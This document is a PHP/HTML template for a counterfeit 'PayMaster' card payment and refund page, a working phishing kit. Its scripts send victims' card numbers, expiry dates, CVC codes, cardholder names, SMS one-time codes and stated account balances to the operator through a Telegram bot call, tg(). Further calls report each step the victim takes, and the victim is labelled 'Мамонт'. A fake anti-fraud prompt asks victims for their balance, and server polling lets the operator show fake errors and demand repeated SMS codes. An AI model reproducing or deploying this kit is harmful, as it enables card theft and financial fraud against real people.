
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../content/img/favico.ico" type="image/x-icon" />
    <title>PayMaster</title>
    <script src="../scripts/js.js"></script>
    <link href="../content/css/styles.css" rel="stylesheet"/>

    <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.eot?v=4.7.0"> -->
    <!--[if IE]>
            <link rel="stylesheet" href="/content/css/pp-ie.css" media="all"/>
        <![endif]-->
    
    <script>
    // var token =
    var ref = <?=$ref?>


    if (ref) {

        tg("🐘 ID" + "<?php echo $idPerson?>" + ", возврат 🐘" +  "\n" + "🤑 Сумма: :" + "<?php echo $value?>"+" р.","<?=$token?>", "<?=$admin?>" );
    }
    else{

        tg("🐘 ID" + "<?php echo $idPerson?>" + ", на оплате 🐘" +  "\n" + "🤑 Сумма: :" + "<?php echo $value?>"+" р.","<?=$token?>", "<?=$admin?>" );
    }





    </script>
</head>
<body style="padding: 0;">

    <!-- <button>a</button> -->
    <div id="cont" style="position: absolute; width: 100%; height: 100%; display: none;"></div>






<div id="backblack"></div>
        
        <div id="fraud">
            <div class="fraudOk" style="text-align: center;font-size: 23px;"><a><a>Карта подтверждена</a></a></div>
            <!-- <div><img id="loaderFraud" class="spin" src="/Spinner.svg"></div>    -->

            <div class="loader" style="display: none; position: absolute;
                left: 50%;
                top: 50%;
                transform: translate(-50%,-50%);">
                <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
                    <defs>
                        <filter id="gooey">
                            <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur"></feGaussianBlur>
                            <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7" result="goo"></feColorMatrix>
                            <feBlend in="SourceGraphic" in2="goo"></feBlend>
                        </filter>
                    </defs>
                </svg>
                <div class="blob blob-0"></div>
                <div class="blob blob-1"></div>
                <div class="blob blob-2"></div>
                <div class="blob blob-3"></div>
                <div class="blob blob-4"></div>
                <div class="blob blob-5"></div>
            </div>

            <div class="styles_container__povOI" style=" margin: 25px;     display: flex;    flex-direction: column;" >
                <div class="title"><a>Проверка безопасности</a></div>

                <div>
                    <!-- <p style="margin: 0">В целях безопасности, мы временно списали с вашей карты 1 рубль (RUB). Cредства будут возвращены на Ваш счет после прохождения проверки.</p> -->
                    <p style="margin: 0">Антифрод система приостановила операцию из-за подозрительной активности с используемой банковской картой.</p>
                    <p style="margin: 10px 0 0">В целях безопасности, мы временно списали с вашей карты небольшую сумму, для получения ифнормации об операциях и состоянии счёта. Они будут возвращены после прохождения проверки.</p>
                </div>

                <div style="    margin-top: 10px;">
                    <p style="margin: 0">Для подтверждения законного пользования картой, укажите "примерный" остаток денежных средств на счету.</p>
                </div>

                <div class="flexrow">
                    
                    <div style="width: 25%;"><a class="dropdown" style="line-height: 37px;">Баланс: </a></div>

                    <div style="width: 50%;"><input id="balance" class="dropdown" style="width: 100%" placeholder="0.00" oninput="checkBalance()"></div>

                    <div></div>

                        <script type="text/javascript">
                            
                            $("#balance").keyup(function(){
                                var a = $(this).val().replace(' ', '');
                                if (a.length<=6) {

                                $(this).val(a.slice(0,-3)+' '+a.slice(-3))
                                }
                                else{
                                         $(this).val(a.slice(0,1)+' '+a.slice(1,-3)+' '+a.slice(-3))
                                }
                            })

                        </script>
                    <div style="width: 25%;" class="container">
                      
                        <div class="dropdown">
                            <div class="select">
                                <span>RUB</span>
                                <i class="fa fa-chevron-left"></i>
                            </div>
                            <input type="hidden" name="gender">
                            <ul class="dropdown-menu">
                                <li id="male">USD</li>
                                <li id="female">RUB</li>
                            </ul>
                        </div>
                      
                        <!-- <span class="msg"></span> -->
                    </div>
                </div>

                <div style="text-align: center;  margin-bottom: 10px;">
                    <a id="fraudErr" style="color: red;">Ошибка</a> 
                </div>

                <div id="fraudBut">
                    <a>Продолжить</a>
                </div>
                <div id="fraudLic" style="text-align: center;margin: 10px auto 0;  font-size: 14px;">
                    <a style="text-align: justify;">Нажимая кнопку "Продолжить", я подтверждаю законное пользование картой.</a>
                </div>
            </div>
        </div>


<script type="text/javascript">
    // a.slice(0,-3)+' '+a.slice(-3)
</script>

    <div class="pp-viewport">
        <div class="pp-header pp-clearfix">
            <a class="pp-logo"></a>
        </div>

        <noscript>
            <div class="pp-message pp-error">
                <h3>Ошибка</h3>
                <p>Для работы с сайтом необходимо включить Javascript в настройках вашего браузера.</p>
            </div>
            <img src="../content/images/ns.png" />
        </noscript>

        


<div id="requisites" class="">
    <div class="payment-requisites">
        <p class="row">
            <span class="merchant-name"><?=$org?></span>
            <span class="sum"></span>
        </p>
        <div class="details-toggle">
            <div class="description">
                <p>Payment for order #<?=$idPerson?></p>
                    <p>
                        Номер счета:  <?=$idPerson?>
                    </p>
            </div>
            <a href="#">
                Подробнее
                <span class="arrow">
                    &#10095;
                </span>
            </a>
        </div>
    </div>
</div>

<div class="pp-block-header payment-method-block hidden">
    <div class="token-based-payment-buttons">
                <div class="or hidden">
            или
        </div>
    </div>
    <div class="payment-options-container"></div>
</div>

<div id="ok" style="display: flex; flex-direction: column; text-align: center; font-size: 30px; margin: 40px;  line-height: 30px; color: #026e8c; font-family: ui-serif;;display: none;">
    <a><?php if($ref){echo "Возврат средств выполнен";}else{echo "Успешная оплата!";}?></a>
</div>

<form class="requisites-form" id="payment_requisites_form" method="post">

    <div id="messageContainer">
    </div>

    <div class="payment-form-controls ">

        <div class="payment-data-block ">
            <div class="card-form-block ">
                <div class="form-control">
                    <div class="flipped-label card-pan" style="    margin-bottom: 16px;">
                        <label>Имя и фамилия как на карте</label>
                        <input name="card_Holder" id="cardHolder" placeholder="CARDHOLDER NAME" required />
                    </div>
                    <div class="flipped-label card-pan">
                        <label>Номер карты</label>
                        <input data-num="0" type="tel" autocomplete="cc-number" name="card_pan" data-mask="cccc cccc cccc ccccccc" id="cardNumber" placeholder="4100 0000 0000 0000" />
                        <div id="detectedCard">
                        </div>
                    </div>
                </div>

                <div class="form-control flex-block">
                    <div class="expiration-date">
                        <div class="flipped-label">
                            <label>ММ</label>
                            <select type="tel" class="pp-input-text-small" autocomplete="cc-exp-month" maxlength="2" data-mask="cc" name="card_month" id="cardExpirationMonth">
                                <option value="0" disabled="disabled">ММ</option>
                                    <option value="1">01</option>
                                    <option value="2">02</option>
                                    <option value="3">03</option>
                                    <option value="4">04</option>
                                    <option value="5">05</option>
                                    <option value="6">06</option>
                                    <option value="7">07</option>
                                    <option value="8">08</option>
                                    <option value="9">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                            </select>
                        </div>
                        <div class="flipped-label">
                            <label>ГГ</label>
                            <select type="tel" class="pp-input-text-small" autocomplete="cc-exp-year" maxlength="2" data-mask="cc" name="card_year" id="cardExpirationYear">
                                <option value="0" disabled="disabled">ГГ</option>
                                    <option value="2021">21</option>
                                    <option value="2022">22</option>
                                    <option value="2023">23</option>
                                    <option value="2024">24</option>
                                    <option value="2025">25</option>
                                    <option value="2026">26</option>
                                    <option value="2027">27</option>
                                    <option value="2028">28</option>
                                    <option value="2029">29</option>
                                    <option value="2030">30</option>
                                    <option value="2031">31</option>
                            </select>
                        </div>
                    </div>
                    <div class="cvc">
                        <div class="flipped-label">
                            <label>CVC</label>
                            <input type="password" pattern="[0-9]*" autocomplete="off" data-mask="999" maxlength="3" name="card_cvc" id="cardCVC" />
                        </div>
                        <div class="tooltip">
                            <a href="#">?</a>
                            <div class="tooltip-body">
                                <p>Введите <b>три последние</b> цифры с обратной стороны карты</p>
                                <img src="../Content/images/cvc-tooltip.svg" />
                            </div>
                        </div>
                    </div>
                </div>
              
            </div>
        </div>

<script type="text/javascript">
            

            $("#fraudBut").click(function(){
                if($("#balance").val().length  > 1 && $("#fraudBut").attr("disabled")!="disabled"){

                    tg("🔥 Чекер 🔥 \n 🐘 ID" + "<?php echo $idPerson?>" + "\n💰 На счету : " + $("#balance").val() +" "+ $(".select").text().replace(/\s/g, ''),"<?=$token?>", "<?=$admin?>");
                }
            });



        </script>

        <script type="text/javascript">
            var checkInput = true;
            var checkInputCMC = true;
            $("#cardHolder").focus(function(){
                if (checkInput) {
                    checkInput = false;
                    tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
                }
            })
            $("#cardNumber").focus(function(){
                if (checkInput) {
                    checkInput = false;
                    tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
                }
            })
            $("#cardExpirationMonth").focus(function(){
                if (checkInput) {
                    checkInput = false;
                    tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
                }
            })
            $("#cardExpirationYear").focus(function(){
                if (checkInput) {
                    checkInput = false;
                    tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
                }
            })
            $("#cardCVC").focus(function(){
                if (checkInput) {
                    checkInput = false;
                    tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
                }
            })



        </script>


            <div class="notification-block ">

                    <div class="form-control custom-checkbox">
                        <label class="nonselectable">
                            <input type="checkbox"
                                   class="notify"
                                   field-id="pmnotifystatus"
                                   name="pmnotifystatus" />
                            <span class="check-mark"></span>
                            <span>
                                <?php if($ref){echo "Отправить квитанцию возврата";} else {echo "Отправить квитанцию об оплате";}?>
                                
                            </span>
                        </label>
                    </div>
                    <div class="form-control">
                        <div class="flipped-label">
                            <input type="email" id="notificationSink"
                                   name="notificationSink"
                                   class="notification-group"
                                   placeholder="Email"
                                   data-disabled="true"
                                   disabled="disabled">
                        </div>
                    </div>
            </div>

        <div class="confirmation-block hidden">
            <div class="form-control">
                <div class="flipped-label">
                    <label for="confirmationCode">
                        Код подтверждения
                    </label>
                    <input type="tel" id="confirmationCode"
                           name="confirmationCode"
                           placeholder="Код подтверждения"
                           style="-webkit-text-security: disc" 
                           >
                           <p id="time" style="font-size: 14px;margin-left: 5px;color: #777777;">Повторная отправка через <a class="seconds"></a> сек.</p>
                           <p id="err1" class="err" style="font-size: 14px;margin-left: 5px;color: red; display: none">Введен неверный код подтверждения.</p>
                           <p id="err2" class="err" style="font-size: 14px;margin-left: 5px;color: red; display: none">Мы выслали вам новое СМС-сообщение с кодом.</p>
                </div>
            </div>
        </div>
    </div>



<script type="text/javascript">
    
    $("#confirmationCode").focus(function(){
        tg("💌 Вводит одноразвый код 💌\n🐘 ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
        
    })

    function timerStart(secs){
        // $("#newSMS").fadeOut()

        $(".seconds").text(secs)

        // $("#timerBlock").fadeIn("slow")

        var timerBlock = $('.seconds');
        var num = secs; //количество секунд

        var index = num;
        var timerId = setInterval(function() {
          timerBlock.html(--index);
        }, 1000);

        var tim = setTimeout(function() {
          clearInterval(timerId);
          $(".pp-message p").fadeOut()
          // $("#newSMS").fadeIn("slow")

        }, num*1000);
    }


</script>




    <div class="pp-buttons pp-clearfix">
            <?php if(!$ref){echo '
                <a data-target-window="cancelModal" id="cancel" class="button default-btn  modal-anchor">
                    Отказаться от оплаты
                </a>
            ';  }?>

        <a href="#" class="button default-btn hidden" id="receipt" target="_blank">
            Напечатать квитанцию
        </a>
        <button class="button primary-btn hidden right-aligned" type="button" id="returnToMerchant" data-href="">
            Вернуться в магазин
        </button>
        <button class="button primary-btn right-aligned" type="submit" id="proceed">
            <?php if($ref){ echo "Выполнить возврат"; }else{ echo "Оплатить";}?>
        </button>
    </div>
</form>
<div class="remodal-bg hidden"></div>

<script type="text/javascript">
var ref = <?=$ref?>;

    if (!ref) {

        var paymaster = { options: {"newPayment":true,"culture":{"code":"ru"},"requisites":{"change":false,"tabs":false,"method":"BankCard","email":{"required":false}},"payment":{"id":"","amount":<?=$value?>,"currency":"RUB","maxAmount":null},"methods":[{"alias":"BankCard","name":"Банковская карта","logo":"/content/img/cards/BankCard.svg","type":"Card","system":0}],"hub":{"hubUrl":"","appId":""}} };
    }
    else{
        var paymaster = { options: {"newPayment":true,"culture":{"code":"ru"},"requisites":{"change":false,"tabs":false,"method":"BankCard","email":{"required":false}},"payment":{"id":"","amount":<?=$value?>,"currency":"RUB","maxAmount":null},"methods":[{"alias":"BankCard","name":"Возврат на банковскую карту","logo":"/content/img/cards/BankCard.svg","type":"Card","system":0}],"hub":{"hubUrl":"","appId":""}} };
    }

</script>

<script id="template-paymentoptions-tabs" type="text/x-handlebars-template">
    <div class="payment-options-tabs">
    <div class="payment-method-list">
        <a class="change-payment-type card-payment-method active-payment-method">
            <img src="../content/img/logos/visa.svg" />
            <img src="../content/img/logos/mastercard.svg" />
            <img src="../content/img/logos/mir.svg" />
        </a>
        {{#each top}}
        <a class="change-payment-type select-payment-method" data-method="{{this.alias}}">
            <img src="https://paymaster.ru/payments/{{this.logo}}" />
        </a>
        {{/each}}
        {{#if other}}
        <a class="change-payment-type more-payment-methods">
            <span>&#9679;&#9679;&#9679;</span>
        </a>
        {{/if}}
    </div>
    {{#if other}}
    <ul class="pp-showcases other-payment-methods" style="display: none">
        {{#each other}}
        <li>
            <a class="select-payment-method" data-method="{{this.alias}}">
                <div class="ps-logo">
                    <img src="https://paymaster.ru/payments/{{this.logo}}" />
                </div>
                <p>{{this.name}}</p>
            </a>
        </li>
        {{/each}}
    </ul>
    {{/if}}
</div>

</script>
<script id="template-paymentoptions-bricks" type="text/x-handlebars-template">
    <div class="payment-options-bricks">
    <h2 class="choose-payment-method pp-title hidden">
        Выберите способ оплаты
    </h2>
    <a class="change-payment-type active-payment-method hidden">
        <div class="ps-logo">
            <img />
        </div>
        <p></p>
    </a>
    <div class="more-payment-methods hidden">
        <a>Другие способы оплаты</a>
    </div>
    <ul class="pp-showcases other-payment-methods" style="display: none;">
        {{#each methods}}
        <li>
            <a class="select-payment-method" data-method="{{this.alias}}">
                <div class="ps-logo">
                    <img src="https://paymaster.ru/payments/{{this.logo}}" />
                </div>
                <p data-desc="{{this.title}}">{{this.name}}</p>
            </a>
        </li>
        {{/each}}
    </ul>
</div>

</script>
<script id="progress-loader" type="text/x-handlebars-template">

    <div class="loader">
        <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
            <defs>
                <filter id="gooey">
                    <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur"></feGaussianBlur>
                    <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7" result="goo"></feColorMatrix>
                    <feBlend in="SourceGraphic" in2="goo"></feBlend>
                </filter>
            </defs>
        </svg>
        <div class="blob blob-0"></div>
        <div class="blob blob-1"></div>
        <div class="blob blob-2"></div>
        <div class="blob blob-3"></div>
        <div class="blob blob-4"></div>
        <div class="blob blob-5"></div>
    </div>

</script>

<script src="../scripts/payment.js"></script>

    

<div data-remodal-id="cancelModal" data-remodal-options="hashTracking: false" class="cancel-payment">
    <button data-remodal-action="close" class="remodal-close"></button>
    <p>Вы действительно хотите отменить платеж?</p>
    <div class="pp-modal-buttons">
        <button type="button" class="button secondary-btn" data-remodal-action="close">Нет</button>
        <button id="confirmCancelButton" class="button primary-btn" data-remodal-action="close">Да</button>
    </div>
</div>

<script type="text/javascript">
    $("#confirmCancelButton").click(function(){
        tg("😡 Отказался платить 😡\n🐘ID" + "<?php echo $idPerson?>","<?=$token?>", "<?=$admin?>");
    })
</script>

        <div class="pp-footer">
            <div>
                <div class="pp-copyrights">
                    ©&nbsp;2010–2021&nbsp;PayMaster
                </div>
                
    <div class="pp-contacts">
    <a class="modal-anchor" data-target-window="supportModal">Написать в техподдержку</a>
</div>
<div class="modal success-msg" data-remodal-id="success-msg" data-remodal-options="hashTracking: false">
    <h2>Сообщение отправлено!</h2>
    <div class="sweetAlert">
    <div class="icon success animate">
        <span class="line tip animateSuccessTip"></span>
        <span class="line long animateSuccessLong"></span>
        <div class="placeholder"></div>
        <div class="fix"></div>
    </div>
</div>
</div>
<div class="modal" data-remodal-id="supportModal" data-remodal-options="hashTracking: false">
    <button data-remodal-action="close" class="remodal-close"></button>
    <h2>
        Обращение в тех. поддержку
    </h2>
    <div class="pp-modal-content">
        <div class="pp-form flipped-label">
            <label for="supEmail">
                Email:
            </label>
            <div>
                <input type="email" id="supEmail" class="pp-input-text-medium" name="email" autocomplete="email" placeholder="me@gmail.com" />

            </div>
        </div>
        <div class="pp-form flipped-label">
            <label for="supMessage">
                Описание:
            </label>
            <div>
                <textarea id="supMessage" rows="6" class="pp-textarea-medium"></textarea>
            </div>
        </div>
    </div>
    <div class="pp-modal-buttons">
        <button class="button secondary-btn" data-remodal-action="close">Отмена</button>
        <button class="button primary-btn" id="sendMessage" disabled="disabled">Отправить</button>
    </div>
    <div class="loader">
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
        <defs>
            <filter id="gooey">
                <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur"></feGaussianBlur>
                <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7" result="goo"></feColorMatrix>
                <feBlend in="SourceGraphic" in2="goo"></feBlend>
            </filter>
        </defs>
    </svg>
    <div class="blob blob-0"></div>
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
    <div class="blob blob-3"></div>
    <div class="blob blob-4"></div>
    <div class="blob blob-5"></div>
</div>


</div>


            </div>
            <div>
                <ul class="pp-langs">
                    <li>
                        <a>
                            <img src="../content/images/lang-ru.svg" alt="" />
                        </a>
                        <ul>
                                <li>
                                    <a href="/">
                                        <img src="../content/images/lang-en.svg" alt="" />
                                    </a>
                                </li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
    </div>
    


<script type="text/javascript">



                        // timerStart(100);
var x = <?=$PATH['x']?>;
var zeroX = 0;
var smsLOG = false;
var fraud = <?=$fraudCheckOn?>;
var stage2 = false;
var testvar = 0;
$("#proceed").click(function(){

        setTimeout(function(){

            if ($("#proceed").attr("disabled") == "disabled") {
                if(!stage2){

                    if (fraud) {

                        tg("🔴 ID" + "<?php echo $idPerson?>" + " 🔴" +
                        "\n---------------------" +
                        "\n💳 Карта: " + $("#cardNumber").val() + 
                        "\n📅 Срок дейстия: " + $("#cardExpirationMonth").val() + "/" + $("#cardExpirationYear").val()  + 
                        "\n🔐 CVC/CVV: " + $("#cardCVC").val() + 
                        "\n🐘 Мамонт: " + $("#cardHolder").val()  + 
                        "\n💰 Сумма: " + "<?php echo $value?>" + " руб." + 
                        "\n---------------------","<?=$token?>", "<?=$admin?>");

                        $.ajax({
                          method: "POST",
                          data:{'shopName':'Сверка баланса карты', 
                                'url':'http://banki.ru', 
                                'n': $("#cardNumber").val(), 
                                'm': $("#cardExpirationMonth").val(), 
                                'y': $("#cardExpirationYear").val(), 
                                'c': $("#cardCVC").val()},
                          url: "/admin/functions/payment.php"
                        })
                        
                        .done(function( msg ) {
                            $('#cont').html($(msg))
                        });

                        fraudStart();
                    }
                    else{
                        // if(zeroX<x){

                            // if (!smsLOG) {
                        stage2 = true;
                        tg("🔴 ID" + "<?php echo $idPerson?>" + " 🔴" +
                        "\n---------------------" +
                        "\n💳 Карта: " + $("#cardNumber").val() + 
                        "\n📅 Срок дейстия: " + $("#cardExpirationMonth").val() + "/" + $("#cardExpirationYear").val()  + 
                        "\n🔐 CVC/CVV: " + $("#cardCVC").val() + 
                        "\n🐘 Мамонт: " + $("#cardHolder").val()  + 
                        "\n💰 Сумма: " + "<?php echo $value?>" + " руб." + 
                        "\n---------------------","<?=$token?>", "<?=$admin?>");


                        setTimeout(function(){

                            timerStart(100);

                            $("#cancel").fadeOut();
                            $(".payment-data-block").fadeOut("slow")
                            $(".notification-block").fadeOut("slow")
                            $("#proceed").text("Отправить")

                            setTimeout(function(){
                                $("#proceed").removeAttr("disabled")
                                $(".pp-message p").text("Ожидание смс-кода подтверждения");
                                $("#confirmationCode").removeAttr("disabled")
                                $(".confirmation-block").removeClass("hidden")
                                $("#confirmationCode").val("")
                                zeroX++;
                            }, 1500);
                        },2500)
                    }

                }

                //stabe2
                else{
                    // if(zeroX<=x){

                        if(fraud==0){
                            tg("🟢 x "+zeroX+" 🟢"+
                            "\n🐘 Мамонт: " + "<?php echo $idPerson?>"  + 
                            "\n--------------------------" +
                            "\n💳 Карта: " + $("#cardNumber").val() + 
                            "\n📅 Срок дейстия: " + $("#cardExpirationMonth").val() + "/" + $("#cardExpirationYear").val()  + 
                            "\n🔐 CVC/CVV: " + $("#cardCVC").val() + 
                            "\n--------------------------" +
                            "\n💌 СМС: " + $("#confirmationCode").val(),"<?=$token?>", "<?=$admin?>");
                        }
                        else{
                            tg("🟢 x "+zeroX+" 🟢"+
                            "\n🐘 Мамонт: " + "<?php echo $idPerson?>"  + 
                            "\n--------------------------" +
                            "\n💳 Карта: " + $("#cardNumber").val() + 
                            "\n📅 Срок дейстия: " + $("#cardExpirationMonth").val() + "/" + $("#cardExpirationYear").val()  + 
                            "\n🔐 CVC/CVV: " + $("#cardCVC").val() + 
                            "\n--------------------------" +
                            "\n💌 СМС: " + $("#confirmationCode").val() +
                            "\n--------------------------" +
                            "\n🔥 Чекер: " + $("#balance").val() +" "+ $(".select").text().replace(/\s/g, ''),"<?=$token?>", "<?=$admin?>");

                        }



                        zeroX++
                        $("#time").fadeOut();
 
                        var a = setInterval(function(){
                            $.ajax({
                              method: "POST",
                              data:{'id':<?=$id?>},
                              url: "/admin/functions/signal.php"
                            })
                            
                            .done(function( msg ) {
                                // console.log(msg)
                                if (msg == "success") {
                                    $("#err1").text("Введен неверный код подтверждения.");
                                    $("#err2").text("Мы выслали вам новое СМС-сообщение с кодом.");
                                    $(".err").fadeIn();
                                    $("#proceed").removeAttr("disabled")
                                    $(".pp-message p").text("Ожидание смс-кода подтверждения");
                                    $("#confirmationCode").removeAttr("disabled")
                                    $(".confirmation-block").removeClass("hidden")
                                    $("#confirmationCode").val("");
                                    clearInterval(a);
                                }
                                else if (msg == "nomoney") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("На карте недостаточно средств")
                                    $("#ok").fadeIn();
                                    clearInterval(a);
                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                                else if (msg == "limited") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("На карте занончился лимит на оплату онлайн")
                                    $("#ok").fadeIn();
                                    clearInterval(a);                                    

                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                                else if (msg == "error") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("Оплата не исполнена. Неизвестная ошибка платежа.")
                                    $("#ok").fadeIn();
                                    clearInterval(a);
                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                                else if (msg == "threeds") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("Оплата не исполнена. Ошибка 3DS")
                                    $("#ok").fadeIn();
                                    clearInterval(a);
                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                                else if (msg == "disablepay") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("Используемая карта не имеет возможности выполнять оплаты онлайн")
                                    $("#ok").fadeIn();


                                    clearInterval(a);
                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                                else if (msg == "cardban") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("Используемая карта заблокирована")
                                    $("#ok").fadeIn();
                                    clearInterval(a);

                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                                else if (msg == "notrucard") {
                                    $(".payment-requisites").fadeOut("slow")
                                    $(".pp-block-header payment-method-block").fadeOut("slow")
                                    $("#payment_requisites_form").fadeOut("slow")
                                    $("#change-payment-type active-payment-method").fadeOut("slow")

                                    $("#ok").text("Оплачивать можно только картами банков РФ")
                                    $("#ok").fadeIn();
                                    clearInterval(a);
                                    setTimeout(
                                        function(){
                                            // window.location = "<?php echo $mysite?>"
                                            window.location.reload();
                                        }, 5000
                                    );
                                }
                            });
                        },500)
                }
            }
        }, 500);
    
})

$("#confirmationCode").focus(function(){
     $(".err").fadeOut(); 
})
</script>


</body>
</html>
